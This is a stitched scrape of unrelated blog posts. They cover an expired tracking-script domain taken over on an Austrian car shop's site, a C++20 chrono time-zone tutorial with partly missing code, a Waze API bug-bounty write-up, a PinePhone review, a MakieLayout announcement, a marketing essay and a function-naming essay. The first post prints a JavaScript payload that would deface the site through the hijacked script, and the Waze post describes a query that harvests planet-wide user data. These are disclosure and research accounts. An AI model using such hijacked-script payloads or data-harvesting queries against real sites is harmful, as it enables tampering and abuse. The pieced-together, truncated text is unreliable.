<p>Hmm.. interesting.. the site seems to have some error and the tracking script can't be loaded.</p>
<p>Or.. could it be..</p>
<figure><img loading="lazy" src="https://pictshare.net/fjtedv.png"><figcaption>Yep, the site isn't even registered anymore</figcaption></figure>
<p>Sooo.. I bought the domain netdiscoverer.eu and now this site (and it turns out a whole bunch of others) are loading scripts from my domain.</p>
<figure><img loading="lazy" src="https://pictshare.net/di2vhn.png"><figcaption>Standard piwik code inclusion on the car shop's website</figcaption></figure>
<p>Now if somebody would be childish and would put these lines of code in a file called piwik.js the site would suddenly change.</p>
<pre><code>document.body.style.backgroundColor = "red"
var imgs = document.getElementsByTagName("img");
for(var i=0, l=imgs.length;i&lt;l;i++){
    imgs[i].src = "http://3.bp.blogspot.com/-KL7d7LdSANg/Tm5VLQf9k4I/AAAAAAAAACo/cSV52JoD7vk/s1600/cat-wallpaper-34-713472.jpg";
    };
alert("Please fix this site");</code></pre>
<p>And would look a bit different</p>
<figure><img loading="lazy" src="https://pictshare.net/mq9x3t.png"><figcaption>Bad code makes site look even worse</figcaption></figure>
<p>But since I'm a responsible IT security person I didn't do that.</p>

<p>In order to buy the windshield I had to make a down payment via their website. They have a button "Paypal down payment" where customers have to click which sends them to a paypal.me site where they have to pay and put their phone number to be called back.</p>
<figure><img loading="lazy" src="https://pictshare.net/82knw7.jpg"><figcaption>PayPal site you get redirected to when you click the "Down payment" button</figcaption></figure>
<p>Oh boy anyone could have bought the netdiscoverer domain and redirected users to another site to pay. Glad I found it before anyone else did.</p>
<p>So I make the down payment, they call me back, I drive to their shop to pick it up and have a whole speech prepared about the importance of IT security and how to find good people to maintain websites, etc but reality got me off guard.</p>

<figure><img loading="lazy" src="https://pictshare.net/4fnesz.jpg"><figcaption>My new windshield in their shop!</figcaption></figure>
<p>I talked to the mechanic, gave them the rest of the money, they gave me the windshield and then I asked who was in charge of their website.
He said it was their "IT freak" but he wasn't around.</p>
<p>I asked if I could get the phone number of the person in charge or if he could get them on the phone for me because their website has a massive flaw but it's easy to fix.</p>
<blockquote>
<p>"So you hacked us? No, I won't give you the number."</p>
<p>-Mechanic</p>
</blockquote>
<p>He said he won't give me the number of their IT person so I left my card and said it's very urgent, they should call me ASAP.</p>
<p>I packed my windshield and drove off slightly annoyed in their reaction.</p>
<p>Half a month later I still didn't get that call and their site is still loading scripts form my servers. You thought the 8th word in my first sentence of this post was a typo? Nope, this country (Austria) doesn't have any kind of urgency when it comes to IT security. I have learned that a few times already.</p>
<figure><img loading="lazy" src="https://pictshare.net/9diz1s.jpg"><figcaption>But at least my Focus has a new windshield</figcaption></figure>

				<p>This post concludes my introduction to the chrono extension in C++20. Today I present the time-zones functionality.</p>

<p>&nbsp;<img src="http://modernescpp.com/images/blog/Cpp20/Times_Zones/TimelineCpp20CoreLanguage.png" alt="TimelineCpp20CoreLanguage" width="650" height="278"></p>
<p>I should have written, today I mainly present the time-zones functionality in C++20. Before I write about the time-zones in C++20, I want to present the online resource <a href="https://github.com/HowardHinnant/date/wiki/Examples-and-Recipes">Examples and Recipes </a>from Howard Hinnant, which has about 40 examples of the new chrono functionality. Presumably, the chrono extension in C++20 is not easy to get; therefore it's quite important to have so many examples. You should use these examples as a starting point for further experiments and, therefore, sharpen your understanding. You can also add your recipes.</p>
<p>To get an idea of&nbsp;<a href="https://github.com/HowardHinnant/date/wiki/Examples-and-Recipes">Examples and Recipes</a> I want to present a program for<a href="https://github.com/rbock"> Roland Bock</a> that calculates ordinal dates.</p>
<h2 id="h1-calculating-ordinal-dates">Calculating Ordinal Dates</h2>
<p>"<em>An <a href="https://en.wikipedia.org/wiki/Ordinal_date" rel="nofollow">ordinal date</a> consists of a year and a day of year (1st of January being day 1, 31st of December being day 365 or day 366). The year can be obtained directly from year_month_day. And calculating the day is wonderfully easy. In the code below we make us of the fact that year_month_day can deal with invalid dates like the 0th of January</em>:" (Roland Bock)</p>
<p>I added the necessary headers to Roland's program.</p>

}

</div>

<p>I want to add a few remarks to the program. Line (1) truncates the current time point. The value is used in the following line to initialize a calendar date. Line (2) calculates the time duration between the two time points. Both time points have the resolution day. Finally, <code>year_day.count()</code> in line (3) returns the time duration in days.<img src="http://modernescpp.com/images/blog/Cpp20/Times_Zones/ordinalDate2.png" alt="ordinalDate2" width="350" height="181"></p>
<p>My following examples to time-zones are also inspired by the already mentioned web resource <a href="https://github.com/HowardHinnant/date/wiki/Examples-and-Recipes">Examples and Recipes</a>.</p>
<h2 id="h2-times-zones">Times-Zones</h2>
<p>First of all, a time-zone is a region and its full history of the date such as daylight saving time or leap seconds. The time-zone library in C++20 is a complete parser of the<a href="https://www.iana.org/time-zones"> IANA timezone database</a>. The following table should give you a first idea of the new functionality.</p>
<p><img src="http://modernescpp.com/images/blog/Cpp20/Times_Zones/timeZone.png" alt="timeZone" width="600" height="277"></p>
<p>I use in my examples the function <code>std::chrono::zones_time</code> which is essentially a time-zone combined with a time point.</p>
<p>Before I show you two examples I want to make a short remark. To compile a program using the time-zone library, you have to compile the<code> tz.cpp</code> file and link against the <code>curl</code> library. The curl library is necessary to get the current <a href="https://www.iana.org/time-zones"> IANA timezone database</a>. The following command line for g++ should give you the idea:</p>

</div>

<p>My first program is straightforward. It displays the UTC time and the local time.</p>
<h3 id="h2-1-utc-time-and-local-time">UTC Time and Local Time</h3>
<p>The<a href="https://en.wikipedia.org/wiki/Coordinated_Universal_Time"> UTC time or Coordinated Univeral Time</a> is the primary time standard worldwide. A computer uses <a href="https://en.wikipedia.org/wiki/Unix_time">Unix time</a> which is a very close approximation of UTC. The UNIX time is the number of seconds since the Unix epoch. The Unix epoch is 00:00:00 UTC on 1 January 1970.</p>
<p><code></code><code>std::chrono::system_clock::now()</code> in line (1) returns in the following program<code> localTime.cpp </code> the Unix time.<code><br></code></p>

<div>
<pre><span>// localTime.cpp</span>

<span>#include "date/tz.h"</span>
<span>#include &lt;iostream&gt;</span>

<span>int</span> <span>main</span>() {

    std<span>::</span>cout <span>&lt;&lt;</span> std<span>::</span>endl;

    <span>using</span> <span>namespace</span> date;
 
    std<span>::</span>cout <span>&lt;&lt;</span> <span>"UTC  time"</span> <span>&lt;&lt;</span> std<span>::</span>endl;             <span>// (1)</span>

    std<span>::</span>cout <span>&lt;&lt;</span> <span>"Local time"</span> <span>&lt;&lt;</span> std<span>::</span>endl;            <span>// (2)</span>
    <span>auto</span> localTime <span>=</span> date<span>::</span>make_zoned(date<span>::</span>current_zone(), utcTime);
    std<span>::</span>cout <span>&lt;&lt;</span> <span>"  "</span> <span>&lt;&lt;</span> localTime <span>&lt;&lt;</span> std<span>::</span>endl;
    std<span>::</span>cout <span>&lt;&lt;</span> <span>"  "</span> <span>&lt;&lt;</span> date<span>::</span>floor<span>&lt;</span>std<span>::</span>chrono<span>::</span>seconds<span>&gt;</span>(localTime.get_local_time()) 
            <span>&lt;&lt;</span> std<span>::</span>endl;

    <span>auto</span> offset <span>=</span> localTime.get_info().offset;         <span>// (3)</span>
    std<span>::</span>cout <span>&lt;&lt;</span> <span>"  UTC offset: "</span>  <span>&lt;&lt;</span> offset <span>&lt;&lt;</span> std<span>::</span>endl;

    std<span>::</span>cout <span>&lt;&lt;</span> std<span>::</span>endl;

}
</pre>
</div>

<p>I have not to add too much to the program. The code block beginning with line (1) gets the current time point, truncates it to seconds, and displays it. The call<code> date::make_zoned</code> creates a <code>std::chrono::zoned_time localTime. T</code>he following call<code> localTime.get_local_time() </code>returns the stored time point as a local time. This time point is also truncated to seconds. <code>localTime</code> (line 3) can also be used to get information about the time-zone. In this case, I'm interested in the offset to the UTC time.</p>
<p><img src="http://modernescpp.com/images/blog/Cpp20/Times_Zones/localTime.png" alt="localTime" width="400" height="297"></p>
<p>My last program answers a crucial question when I teach in a different time-zone: When should I start my online class?</p>
<h3 id="h2-2-various-time-zones-for-online-classes">Various Time-Zones for Online Classes</h3>
<p>The program <code>onlineClass.cpp</code> answers the following question: How late is it in given time-zones, when I start an online class at the <code>7h, 13h,</code> or <code>17h</code> local time (Germany)?</p>
<p>The online class should start on the 1st of February 2021 and should take 4 hours. Because of the daylight saving time, the calendar date is essential to get the correct answer.</p>

<p>Before I dive into the functions<code> getMinutes</code> (line 1) and <code>printStartEndTimes</code> (line 2), let me say a view words about the <code>main</code> function. The <code>main</code> function defines the day of the class, the duration of the class, and all time-zones. Finally, the range-based for-loop (line 3) iterates through all potential starting points for an online class. Thanks to the function <code>printStartEndTimes</code> (line 2) all necessary information is displayed.</p>
<p>The few lines beginning with line (4) calculate the<code> startDate</code> and <code>endDate</code> of my training by adding the start time and the duration of the class to the calendar date. Both values are displayed with the help of the function <code>getMinutes</code> (line 1). <code>date<span>::</span>floor<span>&lt;</span>std<span>::</span>chrono<span>::</span>minutes<span>&gt;</span>(zonedTime.get_local_time())</code> gets the stored time point out of the<code> std::chrono::zoned_time</code> and truncates the value to the minute resolution. To properly align the output of the program, line (5) <code> </code><code></code>determines the size of the longest of all time-zone names. Line (6) iterates through all time-zones and displays the name of the time-zone, and the beginning and end of each online-class. A few calendar dates even cross the day boundaries.<img src="http://modernescpp.com/images/blog/Cpp20/Times_Zones/onlineClass.png" alt="onlineClass" width="600" height="760"></p>
<p>There is more to write about the extended chrono library. For example, C++20 offers new clocks such as<code> std::chrono::utc_clock</code> that include leap seconds, or the<code> std::chrono::tai_clock</code> that represents the International Atomic Time (TAI). Additional, thanks to the new formatting library in C++20, time durations can be nicely formatted. This feature is not available so far. If you want to study the formating rules for time durations, here are they: <a href="https://en.cppreference.com/w/cpp/chrono/system_clock/formatter#Format_specification">std::formatter</a>.</p>
<h2 id="h3-what-s-next">What's next?</h2>
<p>If you want to compare signed and unsigned integrals, you may have a lot of fun. This fun ends with C++20.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<div>

<p><time datetime="2020-11-16T19:40:14Z">Mon, Nov 16, 2020</time></p><p>A month or so ago, I ended up on on the Waze website – specifically, their “<a href="https://www.waze.com/en-GB/livemap">live map</a>".</p>
<p>As I often do, I found myself poking around Firefox’s developer tools, looking to see which API endpoints the webapp was
interacting with.</p>
<p>I noticed that this particular webapp called an which looked like this:</p>
<pre><code>https://www.waze.com/row-rtserver/web/TGeoRSS?bottom=40.73628084811186&amp;left=-74.11780357360841&amp;ma=200&amp;mj=100&amp;mu=20&amp;right=-73.85413169860841&amp;top=40.77825467049393&amp;types=alerts%2Ctraffic%2Cusers
</code></pre><p>The <code>bottom</code>, <code>left</code>, <code>right</code> and <code>top</code> URL parameters are fairly self explanatory (they define the bounding box over which the
API is queried). <code>types</code> defined the data that should be included in the API call response, and <code>ma</code>, <code>mj</code>, and <code>mu</code> seemed to
specify the maximum number of alerts, jams, and users to be returned.</p>
<p>As it often does, curiosity got the better of me. I tried defining a bounding box that covered the whole planet (by setting
<code>bottom=-90</code>, <code>top=90</code>, <code>left=-180</code> and <code>right=180</code>), and just like that, the API was returning 100+mb of JSON data. This JSON
data included planet-wide user-contributed alerts (excluding the US, which uses a different API endpoint but suffered the same
problem). These alerts are user-contributed notices of traffic jams, police, broken down cars, pot holes and the like.</p>
<p><img src="https://redfern.me/images/waze-alerts.jpeg" alt="Alerts across the planet"></p>
<p>It turned out that the <code>ma</code> parameter was being ignored – users and jams were capped at the specified value (which was limited
server-side at ~300), but there was no upper bound on the number of alerts being returned.</p>
<p>This issue probably doesn’t pose an issue to users, but wasn’t the intended behaviour of the API endpoint – competitors and
other interested parties could trivially harvest all user-contributed Waze data in a single API call.</p>
<p>Waze is owned by Google, so I reported the problem to them via their <a href="https://goo.gl/vulnz">preferred channels</a>. After an initial
misunderstanding about the nature of the issue, they agreed that it was an abuse risk and decided to award a $500 bounty!</p>
<p>The timeline was:</p>
<ul>
<li>09/10/2020: reported issue to Google.</li>
<li>12/10/2020: identified as Abuse Risk.</li>
<li>20/10/2020: issue closed and not tracked as security bug due to inclusion of rate limiting, followed by subsequent
clarification that only single request was needed and rate limiting wasn’t effective in this case.</li>
<li>28/10/2020: confirmation that this was a bug and that it would be filed as such – the issue was fixed within 24hrs of this.</li>
<li>10/11/2020: notification that panel had decided to award bounty of $500 USD.</li>
</ul>
<p>This wasn’t a very clever bug, nor was it a very severe one. However, it goes to show that minor issues which are fairly
inconsequential to end users can still be (somewhat) valuable to Google.</p>

<p>Many people, when digging into <a rel="noreferrer noopener" href="https://www.pine64.org/pinephone/" target="_blank">the PinePhone’s specs</a>,  complain about the low storage, the weak CPU, the lacklustre peripherals…</p>



<p>Naturally, they are missing the point. This is not a phone that you would buy to substitute the supercomputer/surveillance device you already carry around in your pocket. Yes, the memory is small; the pics from the camera are a bit grainy; the battery is removable and decent, but doesn’t last all that long. All this is true.</p>



<figure><img loading="lazy" width="960" height="542" src="https://quickfix.es/wp-content/uploads/2020/11/kit-960x542.jpg" alt="" srcset="https://quickfix.es/wp-content/uploads/2020/11/kit-960x542.jpg 960w, https://quickfix.es/wp-content/uploads/2020/11/kit-595x336.jpg 595w, https://quickfix.es/wp-content/uploads/2020/11/kit-768x434.jpg 768w, https://quickfix.es/wp-content/uploads/2020/11/kit.jpg 1500w" sizes="(max-width: 960px) 100vw, 960px" data-lazy-srcset="https://quickfix.es/wp-content/uploads/2020/11/kit-960x542.jpg 960w, https://quickfix.es/wp-content/uploads/2020/11/kit-595x336.jpg 595w, https://quickfix.es/wp-content/uploads/2020/11/kit-768x434.jpg 768w, https://quickfix.es/wp-content/uploads/2020/11/kit.jpg 1500w" data-lazy-src="https://quickfix.es/wp-content/uploads/2020/11/kit-960x542.jpg?is-pending-load=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>The <em>PinePhone – KDE Community Edition with convergence package</em> (USD 199.99)  comes with a (red) cable for flashing and a dock to plug a keyboard, mouse and monitor into your phone (right). SIM and microSD cards not included.</figcaption></figure>



<p>But the specs are low because the manufacturer is working with developers to provide tried-and-tested hardware. “Tried-and-tested” usually also means “old”. Developing an OS and graphical environment is a huge balancing act in which you want to reduce the number of unknowns as much as possible. So you go for what is familiar, with what has been proven to work, with what is well-documented. This usually means hardware that other manufacturers don’t care about any more and that can be safely reverse engineered, has been reverse engineered by others, or has directly had its technical specifications disclosed.</p>



<p>The aim becomes to get <a rel="noreferrer noopener" href="https://kde.org/announcements/pinephone-plasma-mobile-edition/" target="_blank">Plasma Mobile running on basic, well-understood hardware and then build up from there</a>.</p>



<div><figure><img loading="lazy" src="https://quickfix.es/wp-content/uploads/2020/11/switches_small-3-960x738.jpg" alt="" width="400" height="308" srcset="https://quickfix.es/wp-content/uploads/2020/11/switches_small-3-960x738.jpg 960w, https://quickfix.es/wp-content/uploads/2020/11/switches_small-3-595x457.jpg 595w, https://quickfix.es/wp-content/uploads/2020/11/switches_small-3-768x590.jpg 768w, https://quickfix.es/wp-content/uploads/2020/11/switches_small-3.jpg 1500w" sizes="(max-width: 400px) 100vw, 400px" data-lazy-srcset="https://quickfix.es/wp-content/uploads/2020/11/switches_small-3-960x738.jpg 960w, https://quickfix.es/wp-content/uploads/2020/11/switches_small-3-595x457.jpg 595w, https://quickfix.es/wp-content/uploads/2020/11/switches_small-3-768x590.jpg 768w, https://quickfix.es/wp-content/uploads/2020/11/switches_small-3.jpg 1500w" data-lazy-src="https://quickfix.es/wp-content/uploads/2020/11/switches_small-3-960x738.jpg?is-pending-load=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>Kill swatches under the back cover of the PinePhone let you deactivate the modem, WiFi and Bluetooth, microphone, cameras and headphones.</figcaption></figure></div>



<p>On the other hand, this <strong>is</strong> the phone you would buy if you wanted to try out one or several of the <a rel="noreferrer noopener" href="https://www.plasma-mobile.org/" target="_blank">fledgling</a> <a rel="noreferrer noopener" href="https://ubports.com/" target="_blank">Free and Open Source</a> <a rel="noreferrer noopener" href="https://developer.puri.sm/Librem5/Software_Reference/Environments/Phosh.html" target="_blank">mobile</a> <a rel="noreferrer noopener" href="https://postmarketos.org/" target="_blank">systems</a>. The PinePhone provides you with all the tools you need to try out all and every one of them in an afternoon, making booting and flashing child’s play. Maybe it will even encourage you to help build the future of mobile, be it with code, design ideas, or just bug reports. It is a phone that fosters grassroots, community-driven contributions.</p>



<p>This is by design.</p>



<p>Once a couple things get working reliably in Plasma Mobile, it is also the phone you would buy to protect your privacy, as ALL the software is free and open and can be audited in depth. Want to not worry about spying, leaking proprietary software? This is the phone for you. Plus it even comes with physical hardware kill switches that allow you to turn off its WiFi, microphone, cameras, etc..</p>



<p>Besides, when you use this phone,  you become a proud pioneer of the FLOSS wave that will, one day, take over the mobile world; providing you with a privileged (but affordable) view into what is to come.</p>



<p>So, sure, your friends may brag about their latest iPhones, with their sharp cameras, smooth-as-butter interfaces, and crystalline sounds, while they look down on your modest PinePhone. But the walled-garden, programmed obsolescence and expensive and spying software they have to endure on  devices they don’t even get to own don’t contribute to push the envelope for a better, more humane technology, or make their owners trailblazers in any shape or form. Quite the contrary, they just make them a bunch of deluded iChumps.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div> <h2 id="making_elegant_plots_is_too_hard"><a href="#making_elegant_plots_is_too_hard">Making Elegant Plots Is (Too) Hard</a></h2> <p>Researchers often need to create complex visualizations, that go far beyond a single axis or a simple subplot grid. This is especially true for graphics meant for publication, which are held to a higher aesthetic standard. Still, most commonly used plotting software doesn't offer a straight-forward path to create clean custom layouts with nicely aligned axes.</p> <p>Therefore, the users of basically all well-known plotting solutions often have to resort to hacks, brittle manual tweaking, or even roundtrips to Illustrator to achieve the results they want. Common issues are overlaps, misalignments and lots of work to redo if the figure size ever changes.</p> <h2 id="makielayout_makes_layouting_graphics_easy"><a href="#makielayout_makes_layouting_graphics_easy">MakieLayout Makes Layouting Graphics Easy</a></h2> <p><a href="http://makie.juliaplots.org/stable/makielayout/tutorial.html">MakieLayout</a> is a layout engine that attempts to solve these issues and more. It is now part of the <a href="http://makie.juliaplots.org/stable/">Makie plotting ecosystem</a> for the Julia language.</p> <p>Here is a totally made up example plot showing what MakieLayout can do:</p> <p><img src="https://jkrumbiegel.github.io/assets/2020-11-15-makielayout/example_1.svg" alt="Example 1"></p> <p>Among other things, this plot features a colorbar spanning two axes horizontally while aligning perfectly with a neighboring axis, and a legend describing three grids of 3x3 subplots each. The legend is placed in its own subsection instead of right next to or within any of the small subplots. The right colorbar is specifically chosen to align with the bottom content at the outer text border in order to save white-space.</p> <p>Here's a small code example which demonstrates how simple it is to place the elements of the upper half in nested grids. </p> <pre><code>scene, layout <span>=</span> <span>layoutscene</span>(resolution <span>=</span> (<span>1200</span>, <span>1000</span>))

top_grid <span>=</span> layout[<span>1</span>, <span>1</span><span>:</span><span>3</span>] <span>=</span> <span>GridLayout</span>()
topleft_grid <span>=</span> top_grid[<span>1</span>, <span>1</span>] <span>=</span> <span>GridLayout</span>()

topleft_grid[<span>1</span>, <span>1</span>] <span>=</span> <span>LAxis</span>(scene, title <span>=</span> <span>"Pyramidal Cells"</span>)
topleft_grid[<span>1</span>, <span>2</span>] <span>=</span> <span>LAxis</span>(scene, title <span>=</span> <span>"Layer IV Neurons"</span>)
topleft_grid[<span>2</span>, <span>:</span>] <span>=</span> <span>LColorbar</span>(scene,
    vertical <span>=</span> <span>false</span>, height <span>=</span> <span>20</span>,flipaxisposition <span>=</span> <span>false</span>,
    ticklabelalign <span>=</span> (<span>:center</span>, <span>:top</span>), label <span>=</span> <span>"Spike Rate"</span>)

top_grid[<span>1</span>, <span>2</span>] <span>=</span> <span>LAxis</span>(scene, title <span>=</span> <span>"Particle Simulation"</span>,
    xlabel <span>=</span> <span>"Velocity [m/s]"</span>, ylabel <span>=</span> <span>"Acceleration [m/s²]"</span>)
top_grid[<span>1</span>, <span>3</span>] <span>=</span> <span>LColorbar</span>(scene, width <span>=</span> <span>20</span>,
    label <span>=</span> <span>"Energy [j/mol]"</span>, alignmode <span>=</span> <span>Outside</span>())

layout[<span>2</span>, <span>:</span>] <span>=</span> <span>LRect</span>(scene, color <span>=</span> <span>:gray94</span>)
layout[<span>2</span>, <span>:</span>] <span>=</span> <span>LText</span>(scene, <span>"Group Measurements"</span>, padding <span>=</span> (<span>5</span>, <span>5</span>, <span>5</span>, <span>5</span>))</code></pre> <p>In most tools, superficially simple things like adding supertitles, sub-labels, or legends and colorbars in odd places tend to be quite difficult. Tools that do allow for static layout optimizations usually break apart under interactive conditions, when figure size changes dynamically and content has to follow.</p> <h2 id="its_grids_all_the_way_down"><a href="#its_grids_all_the_way_down">It's Grids All The Way Down</a></h2> <p>MakieLayout allows users to assemble complex graphics or interactive visualizations using flexible grids that are highly customizable for the greatest creative freedom. Elements can shrink or expand to fit the available space, and are always aligned in a visually pleasing way.</p> <p>MakieLayout doesn't just use simple table layouts like CSS, e.g., because they only work well for simple box-like elements. The restriction to boxes is the main reason why researchers often struggle to make nicely aligned graphics.</p> <p>Instead, MakieLayout extends the table concept with <em>protrusions</em>, which describe the statically sized content "sticking out" of the main elements, like axis decorations. Protrusions become part of the gaps between cell columns by default and don't count when calculating aspect ratios or relative column sizes. This makes it easy to align different subplots along their axes, but also allows for unlimited tweaking, if this default mode is not the right answer.</p> <p>Grid layouts can be nested to arbitrary levels, and can follow aspect ratio, absolute, or relative sizing. This removes the need for a whole class of hacks often used to distribute elements of different sizes in visually pleasing ways.</p> <p>Legends and colorbars in MakieLayout are first-class elements that are not tied to specific axes and can be freely placed anywhere.</p> <p>The example at the beginning involved no layout-tweaking whatsoever. Elements were simply placed in appropriately nested grids, with small aesthetic adjustments of some default settings.</p> <h2 id="interactive_and_dynamic_visualizations"><a href="#interactive_and_dynamic_visualizations">Interactive and Dynamic Visualizations</a></h2> <p>Together with the interactive Makie plotting ecosystem, axes, sliders, buttons and other widgets can be combined to easily create useful applications for data visualization and exploration. The Julia language offers very high performance so interactions are smooth and responsive.</p> <p>In this short demonstration video, you can see how elements are added to and removed from a layout dynamically. Resizing the window recalculates the layout and elements are never overlapping or otherwise misaligned. Plots can be controlled with sliders and buttons, and via a textbox, dynamically calculated function plots are added by specifying the right half of the equation in valid Julia code:</p> <p> <iframe src="https://www.youtube.com/embed/C5wsl0dxGhI" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""> </iframe> </p> <h2 id="future_directions"><a href="#future_directions">Future Directions</a></h2> <p>As you can see, even though the Makie ecosystem is still in flux, MakieLayout can be used already to create professional and clean-looking graphics well-suited for publication. The dynamic plotting features based on Observables are easy to use and can save a lot of time when writing quick data exploration tools.</p> <p>In the future, we will focus on making the Makie ecosystem more feature complete and stable. Right now, MakieLayout has to be specifically imported, but we're planning to use it as the default infrastructure for all 2D plots, which should make using it less verbose as well. Although Makie can be compiled via PackageCompiler.jl, it is still a big goal to reduce the relatively long time to first plot, owing to the JIT compilation of Julia.</p> <p>To get started, check out the basic <a href="http://makie.juliaplots.org/stable/basic-tutorial.html">Makie tutorial here</a>, and once you get the basics, have a look at the <a href="http://makie.juliaplots.org/stable/makielayout/tutorial.html">MakieLayout tutorial here</a>.</p>  </div></div>]]>

            <p><em>This article was written with help from <a href="https://www.linkedin.com/in/gitbisect/">Jason Yee, Director of Advocacy at Gremlin</a>. Thanks, Jason!</em></p>

<p>Developer advocacy is a way of giving software engineers a voice within your company, and helping them be successful with your product. Related disciplines include community management, which is about building a community around your product, and evangelism, which is about more deliberately promoting your product, through tools, assets, and building relationships.</p>

<p>All of these are ways of building interest that rely on deeply understanding users, building relationships with them, and constantly demonstrating how the product solves their problems. There are some specific lessons from this practice that are helpful for all marketers.</p>

<h2 id="your-audience-wants-to-be-unblocked">Your audience wants to be unblocked</h2>

<p>Your audience is trying to accomplish a task. Whether it’s an HR manager setting up rubrics for employee performance, a sales leader trying to close more deals, or a software engineer trying to solve a very specific technical problem – your audience is looking for ways to solve very specific problems.</p>

<p>The goal of developer advocacy is to unblock the work of developers. But as a marketer, you’ll do your best marketing when you think about unblocking the work of your audience.</p>

<p>What’s getting in their way, today? How does your product address those problems, specifically? And what content can you produce that will help alongside your product? For the HR manager, maybe it’s a template for performance reviews, or a guide to setting goal areas, or something else. Those assets attract visitors, and they work alongside your product to help solve your users’ problem.</p>

<h2 id="a-deep-understanding-of-your-product-is-key">A deep understanding of your product is key</h2>

<p>Someone working with developers has to have a detailed technical understanding of what it is that their product does, and how. It isn’t much use if, at a tradeshow, a technical evangelist can’t answer detailed questions about what their product does.</p>

<p>But a deep understanding of your product can be helpful to anyone in a marketing role, too. For demand generation, the specific problems of a customer can show up in search terms for paid advertising and landing page copy. For content marketing, knowing what your product does is important for generating content ideas, and then promoting them with the right language on social and other channels. Even brand marketers should have a good sense of what the product really does – if a product solves a problem by increasing ease of use, that might result in a different brand message from a solution that involves saving money or time.</p>

<p>It isn’t necessary for everyone to be able to effectively pitch, or even understand a lot of technical details. But knowing enough to develop empathy with customers can improve your marketing dramatically. Otherwise, you end up talking in vague, ineffective ways.</p>

<h2 id="being-not-sales-helps-you-close-the-sale">Being not-sales helps you close the sale</h2>

<p>A big part of marketing is building credibility over time. Most marketing tactics have this as a goal, at least indirectly. For example, advertising can make your brand seem more real, and communicate your value proposition in a memorable way. High-quality blog content conveys expertise. Even excellent design can help because it makes you appear thoughtful about your product and what it delivers.</p>

<p>Buyers know when your motivation is to close a sale, and that undermines credibility; this is particularly true when marketing to developers who are generally experts in your product’s domain.</p>

<p>It works better when someone else is involved who’s viewed as being there to educate, rather than sell. That person can accurately and honestly answer questions about whether a product will solve a specific use case, and is viewed as an educator, rather than a seller.</p>

<h2 id="documentation-makes-great-marketing">Documentation makes great marketing</h2>

<p>An often-overlooked but major driver of traffic for a lot of our clients is product documentation.</p>

<p>One obvious reason is that customers need access to documentation in order to use your product. But documentation can also be a valuable tool to reach people who are not customers yet. Documentation builds credibility by:</p>

<ul>
  <li>Giving visitors a sense of what it’s like to use your product. Is your documentation well-organized, easy to use, and comprehensive? Is its language and tone clear, but also warm and accessible?</li>
  <li>Showing the problems your product solves, what it can do, and what use cases it’s for – particularly if it contains wide-ranging tutorial and use case content,</li>
  <li>Explaining how your product has evolved over time, and what new features have been released.</li>
  <li>Laying out exact technical specifications.</li>
</ul>

<p>Today, documentation is viewed as critical for developer-facing products. But in fact, for all products, documentation is an opportunity to sell the product (and, by the way, increase customer satisfaction and reduce support costs.)</p>

<h2 id="conclusion">Conclusion</h2>

<p>Marketing that frustrates, annoys, or confuses prospects is extremely common and is becoming less and less effective over time. Take inspiration from advocacy and evangelism teams to keep the focus on credibility, authenticity, and value – which can help build a far more effective marketing funnel, too.</p>

would be of very little use if they weren't. However, functions exist to create
a level of abstraction, an informal set of conceptual building blocks. In most
programs you will write, these levels are not clear cut and defined by algebra,
geometry or physics, but loose and malleable, driven by your domain model and
the needs underlying your business logic.</p>

<p>Therefore, you should expect the definition of "One Thing" to admit <em>some</em>
wiggle room. Nevertheless, it is a very effective heuristic to apply to your
code. It's a fairly easy test to apply, and functions that clearly fail it are
very strong candidates for refactoring. Try not to worry about the edge cases.</p>

<p>An even stronger version of this test is that functions should never have a
conjunction in their name. A name should clearly express what the function does
at its level of abstraction; if that name has a <code>_and_</code> in it, that means that
that function is failing to do one thing by its own admission.</p>

<p>I've worked on code-bases with chronic problems that were caused largely by
functions with names like:</p>

<pre><code>create_or_update_xxx()
login_or_signup_user()
find_and_transform()
maybe_cache()
</code></pre>

<p>These problems went away once we were able to refactor these functions to only
do one thing, which was easy, and then change their call sites to use these new
functions, which was not. This, like many warnings against vice, is a much better
preventative than a cure.</p>

<p>Given that, I was called to reflection by a co-worker's code review, where he
pointed out that I'd written a group of functions with the word "maybe" in their
names. It was in a piece of code that handled integration with a legacy system
that was loose with types, and so these function existed to perform type
conversion--if needed.</p>

<p>A typical candidate looked like <code>maybe_convert_to_int(var: Any) -&gt; int</code>, and its body
would check whether the incoming variable had the right type, or if needed,
would apply the necessary conversion.</p>

<p>At first, I was puzzled and dismayed. To me, it was obvious that these functions
were necessary because they are dealing with unreliable data. However, the way
that I had named them, and therefore justified them to their calling clients,
expressed an uncertainty as to what they actually did. <em>Maybe</em> convert to int?
And despite what I'd said earlier, about not sweating the edge cases, I was
beginning to doubt my own advice.</p>

<p>Then it dawned at me that I was committing the error of analysing these
functions at the wrong level of abstraction. By focusing on how they operated, I
was obscuring what exactly they did.</p>

<p>In this case, I was able to fix the problem by considering the reason you'd call
this function--to ensure that a certain variable always has a given type. Viewed
from that lens, the function only does one thing, it ensures that it returns an
int. So it should be called, <code>ensure_int(var: Any) -&gt; int</code></p>

<p>After renaming my functions, I resubmitted my review and renewed my committment to
the framework above.</p>

<p>The next time I run into a dilemma like this, it might require more than a
simple rename. If my initial rough-cut of the function mixes two
responsibilities from the consumer's level of abstraction, this simple lexical
rule might trigger their disentangling. That would be well worth it.</p>

<p>Maybe your functions are doing one and only one thing. Ensure that, when viewed
from the persective of your consumer, they are.</p>

